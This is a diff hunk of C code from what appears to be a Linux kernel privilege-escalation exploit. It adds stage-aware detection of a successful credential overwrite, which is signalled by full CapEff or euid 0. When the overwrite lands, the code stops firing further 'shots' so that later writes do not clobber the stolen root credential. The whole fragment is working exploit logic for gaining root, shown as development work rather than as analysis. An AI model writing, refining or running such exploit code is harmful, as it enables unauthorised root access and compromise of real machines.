@@ -522,14 +522,31 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
           if (sn > 0) {
             sbuf[sn] = 0;
             unsigned long long s_cap = 0;
+            int s_euid = -1;
             int s_root = 0;
+            const char *mt51_stage = getenv("PSELECT_PTR_STAGE");
+            int mt51_is_c = mt51_stage && (*mt51_stage == 'C' || *mt51_stage == 'c');
             char *cp = strstr(sbuf, "CapEff=");
             if (cp) s_cap = strtoull(cp + 7, NULL, 16);
+            char *ep = strstr(sbuf, "euid=");
+            if (ep) s_euid = atoi(ep + 5);
             char *rp = strstr(sbuf, "root_seen=");
             if (rp) s_root = atoi(rp + 10);
-            if (s_cap >= 0x000001ffffffffffULL || s_root) {
-              pr_info("mt51: mid-burst landing (CapEff=%016llx root=%d)"
-                      " - abort shots ti=%d\n", s_cap, s_root, ti);
+            /* mt71: stage-aware mid-burst abort.
+             * R stage: CapEff full (real_cred switched) is the landing signal.
+             * C stage: CapEff is already full from the prior R write, so that
+             * check would false-positive on every burst.  For C the correct
+             * landing signal is euid==0 (cred switched).  Without this, C
+             * keeps firing all 6 shots after a successful cred write and later
+             * shots can clobber the credential back, which matches the
+             * full-storm C 0/N observations. */
+            int mt51_landed = s_root ||
+                (mt51_is_c ? (s_euid == 0) :
+                             (s_cap >= 0x000001ffffffffffULL));
+            if (mt51_landed) {
+              pr_info("mt51: mid-burst landing (CapEff=%016llx euid=%d root=%d"
+                      " stage=%s) - abort shots ti=%d\n",
+                      s_cap, s_euid, s_root, mt51_is_c ? "C" : "R", ti);
               fflush(stdout);
               break;
             }
